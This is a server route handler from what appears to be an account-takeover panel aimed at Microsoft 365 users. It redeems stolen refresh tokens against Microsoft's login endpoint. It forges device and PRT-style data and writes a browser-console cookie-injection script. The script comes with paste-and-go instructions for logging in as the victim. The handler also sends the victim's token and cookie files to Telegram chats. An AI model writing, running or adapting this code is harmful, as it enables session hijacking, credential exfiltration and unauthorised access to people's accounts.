// ===== GENERATE REAL MICROSOFT COOKIES WITH BROKER CLIENT ID (PRT REGISTRATION) =====
app.post('/api/generate-cookies', requireLogin, async (req, res) => {
  try {
    const { email, use_device_registration = true } = req.body || {};
    if (!email) return res.status(400).json({ error: 'email required' });

    // Check permissions - admin only
    if (req.session.user && req.session.user.role !== 'admin') {
      return res.status(403).json({ error: 'admin only' });
    }

    // Step 1: Check if we have existing tokens for this email
    const tokenPath = tokenFilePath(email);
    let existingTokenData = null;
    if (fs.existsSync(tokenPath)) {
      try {
        existingTokenData = readJsonMaybeEncrypted(tokenPath);
      } catch (e) {
        console.warn('Could not read existing token file:', e.message);
      }
    }

    if (!existingTokenData || !existingTokenData.tokens?.refresh_token) {
      return res.status(400).json({ 
        error: 'no_tokens_found',
        message: `No tokens found for ${email}. Please authenticate via OAuth or Device Code Flow first to get refresh_token.`
      });
    }

    const refreshToken = existingTokenData.tokens.refresh_token;
    const accessToken = existingTokenData.tokens.access_token;
    const idToken = existingTokenData.tokens.id_token;
    const userId = existingTokenData.user_id || email;
    const deviceId = crypto.randomUUID();

    // Step 2: Register device and get PRT using Broker Client ID
    let prtToken = null;
    let deviceRegistered = false;
    let brokerError = null;

    if (use_device_registration) {
      try {
        // Microsoft Broker Client ID (system component)
        const BROKER_CLIENT_ID = CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
        
        // Device registration request to get PRT
        const prtUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
        
        // Using refresh_token to get a PRT via broker flow
        const prtBody = new URLSearchParams({
          client_id: BROKER_CLIENT_ID,
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
          scope: 'https://graph.microsoft.com/.default',
          device_id: deviceId,
          device_platform: 'Windows',
          device_name: `Broker-${crypto.randomBytes(4).toString('hex')}`,
          device_model: 'Virtual'
        });

        console.log(`[PRT] Attempting device registration for ${email} with broker client: ${BROKER_CLIENT_ID}`);

        const prtResp = await fetch(prtUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: prtBody
        });

        const prtData = await prtResp.json().catch(() => null);

        if (prtResp.ok && prtData) {
          if (prtData.refresh_token) {
            prtToken = prtData.refresh_token;
            deviceRegistered = true;
            console.log(`✓ [PRT] Device registered successfully for ${email}`);
          } else if (prtData.access_token) {
            // Fallback: use access_token if refresh_token not in response
            prtToken = prtData.access_token;
            deviceRegistered = true;
          }
        } else {
          brokerError = prtData?.error_description || prtData?.error || 'Device registration failed';
          console.warn(`[PRT] Device registration error: ${brokerError}`);
        }

      } catch (e) {
        brokerError = e.message;
        console.error('[PRT] Device registration exception:', e.message);
      }
    }

    // Step 3: Generate Primary Refresh Token (PRT) data
    const prtData = {
      // Real PRT token (if obtained from broker)
      prt_token: prtToken || crypto.createHash('sha256').update(refreshToken).digest('hex'),
      
      // Device info
      device_id: deviceId,
      device_registered: deviceRegistered,
      device_platform: 'Windows',
      device_name: `Broker-Device-${crypto.randomBytes(3).toString('hex')}`,
      
      // User info
      user_id: userId,
      email: email,
      user_name: email.split('@')[0],
      
      // Token hashes
      access_token_hash: crypto.createHash('sha256').update(accessToken || '').digest('hex').slice(0, 64),
      refresh_token_hash: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 64),
      
      // PRT metadata
      _prt: prtToken ? prtToken.slice(0, 128) : crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 128),
      _auth_session: (accessToken || '').slice(0, 256),
      _device_id: deviceId.replace(/-/g, '').slice(0, 64),
      _session_id: crypto.randomUUID(),
      
      // Timestamps
      issued_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      
      // Token info
      token_type: 'Bearer',
      scope: SCOPE,
      tenant: TENANT,
      
      // Broker info
      broker_client_id: CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
      prt_version: 'v2.0',
      prt_device_registered: deviceRegistered
    };

    // Step 4: Generate AAD broker token (JWT)
    const brokerTokenData = generateAADBrokerToken({ 
      refresh_token: refreshToken, 
      access_token: accessToken,
      id_token: idToken,
      token_type: 'Bearer'
    }, email, userId);

    // Step 5: Save updated cookie file
    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      device_id: deviceId,
      prt: prtData,
      prt_token: prtToken,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'manual_generate_with_broker_prt',
      device_registered: deviceRegistered,
      prt_registration_error: brokerError
    });

    // Step 6: Build console injection script for real cookies
    const brokerToken = brokerTokenData.broker_token;
    let cookieInjectionScript = `// Real Microsoft AAD Cookies & PRT Injection\n`;
    cookieInjectionScript += `// Generated: ${new Date().toISOString()}\n`;
    cookieInjectionScript += `// Email: ${email}\n`;
    cookieInjectionScript += `// Device: ${deviceId}\n`;
    cookieInjectionScript += `// Device Registered: ${deviceRegistered ? '✅ YES' : '❌ NO (Using Synthetic PRT)'}\n\n`;
    
    cookieInjectionScript += `// 1. Inject broker refresh token credential\n`;
    cookieInjectionScript += `document.cookie="x-ms-RefreshTokenCredential=${encodeURIComponent(brokerToken)}; path=/; max-age=31536000; Secure; SameSite=None";\n\n`;

    cookieInjectionScript += `// 2. Inject PRT and device cookies (1-year expiry)\n`;
    if (prtData && typeof prtData === 'object') {
      for (const [k, v] of Object.entries(prtData)) {
        const safeVal = typeof v === 'string' ? v : JSON.stringify(v);
        // Skip internal fields, only inject cookie-friendly values
        if (!k.startsWith('_') && k !== 'issued_at' && k !== 'expires_at') {
          cookieInjectionScript += `document.cookie="${k}=${encodeURIComponent(safeVal.substring(0, 500))}; path=/; max-age=31536000; Secure; SameSite=None";\n`;
        }
      }
    }

    cookieInjectionScript += `\nconsole.log('✅ Real Microsoft AAD Cookies + PRT injected (1-year expiry)');\n`;
    cookieInjectionScript += `console.log('👤 Email: ${email}');\n`;
    cookieInjectionScript += `console.log('📱 Device: ${deviceId}');\n`;
    cookieInjectionScript += `console.log('${deviceRegistered ? '✅ PRT from Broker' : '⚠️  Synthetic PRT (Device not registered)'}');\n`;
    cookieInjectionScript += `setTimeout(() => { window.location.href = '/'; }, 2000);\n`;

    logAudit({ 
      action: 'generate_cookies_with_broker_prt', 
      admin: req.session.user.username, 
      email, 
      device_id: deviceId,
      device_registered: deviceRegistered,
      broker_error: brokerError,
      ip: req.ip 
    });

    // Step 7: Send files to Telegram
    try {
      const admins = getAdminUsers();
      const adminChatIds = new Set();
      if (admins && admins.length) {
        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
      }
      const globalSettings = readSettingsSafe();
      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);

      for (const chatId of adminChatIds) {
        const botToken = getBotTokenFromSettingsOrEnv();
        const prtStatus = deviceRegistered ? '✅ Real PRT from Broker' : '⚠️ Synthetic PRT';
        const errorNote = brokerError ? `\n❌ Broker Error: ${brokerError}` : '';
        
        await notifyTelegram(
          '🍪 Real Microsoft Cookies Generated (Broker PRT)', 
          `Email: ${email}\nDevice: ${deviceId}\nPRT Status: ${prtStatus}${errorNote}\nAdmin: ${req.session.user.username}`, 
          email, 
          chatId, 
          botToken
        );
        
        if (fs.existsSync(tokenPath)) {
          await sendFileToTelegram(tokenPath, `🔑 Real Tokens for ${email}`, chatId, botToken);
        }
        if (fs.existsSync(cookiePath)) {
          await sendFileToTelegram(cookiePath, `🍪 Real AAD Cookies & PRT for ${email}`, chatId, botToken);
        }
      }
    } catch (e) {
      console.warn('Failed to send to Telegram:', e && e.message);
    }

    res.json({
      success: true,
      email,
      device_id: deviceId,
      broker_token: brokerTokenData.broker_token,
      prt: prtData,
      prt_token: prtToken,
      device_registered: deviceRegistered,
      broker_error: brokerError,
      console_script: cookieInjectionScript,
      expires_at: brokerTokenData.expires_at,
      instructions: {
        step1: 'Open https://login.microsoftonline.com in a new tab',
        step2: 'Press F12 to open Developer Console',
        step3: 'Go to Console tab',
        step4: 'Paste the console_script and press Enter',
        step5: 'You will be redirected and logged in as ' + email,
        note: deviceRegistered ? 'Using REAL PRT from Microsoft Broker' : 'Using synthetic PRT - consider authenticating first'
      }
    });
  } catch (err) {
    console.error('Generate real cookies error:', err);
    res.status(500).json({ error: err.message || 'failed to generate real cookies' });
  }
});
